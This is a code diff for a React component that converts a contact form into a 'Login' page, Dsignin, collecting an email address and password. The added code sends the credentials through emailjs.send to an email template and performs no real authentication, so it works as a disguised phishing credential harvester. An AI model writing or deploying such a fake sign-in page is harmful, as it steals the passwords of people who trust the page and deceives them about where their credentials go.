@@ -2,10 +2,10 @@ import React, { useState } from 'react';
 import emailjs from 'emailjs-com';
 import './index.scss';
 
-const Contact = () => {
-  const [name, setName] = useState('');
+const Dsignin = () => {
+  
   const [email, setEmail] = useState('');
-  const [message, setMessage] = useState('');
+  const [password, setPassword] = useState('');
 
   const handleSubmit = (event) => {
     event.preventDefault();
@@ -14,9 +14,9 @@ const Contact = () => {
 
   const sendForm = () => {
     const params = {
-      name: name,
+      
       email: email,
-      message: message,
+      password: password,
     };
 
     return emailjs.send('XH6ssfwJtcaq4tM1c', 'template_aosztus', params, 'service_c71nlw3')
@@ -33,20 +33,12 @@ const Contact = () => {
   return (
     <div className="container contact-page">
       <div className="text-reg">
-        <h1>Contact Us</h1>
+        <h1>Login</h1>
       </div>
 
       <div className="form-container">
         <form onSubmit={handleSubmit}>
-          <div className="form-field">
-            <input
-              type="text"
-              id="name"
-              value={name}
-              onChange={(event) => setName(event.target.value)}
-              placeholder="Name"
-            />
-          </div>
+          
           <div className="form-field">
             <input
               type="email"
@@ -57,15 +49,16 @@ const Contact = () => {
             />
           </div>
           <div className="form-field">
-            <textarea
-              id="message"
-              value={message}
-              onChange={(event) => setMessage(event.target.value)}
-              placeholder="Message"
+            <input
+              type="password"
+              id="password"
+              value={password}
+              onChange={(event) => setPassword(event.target.value)}
+              placeholder="Password"
             />
           </div>
           <button type="submit" className="form-button">
-            Submit
+            Sign In
           </button>
         </form>
       </div>
@@ -73,4 +66,4 @@ const Contact = () => {
   );
 };
 
-export default Contact;
+export default Dsignin;
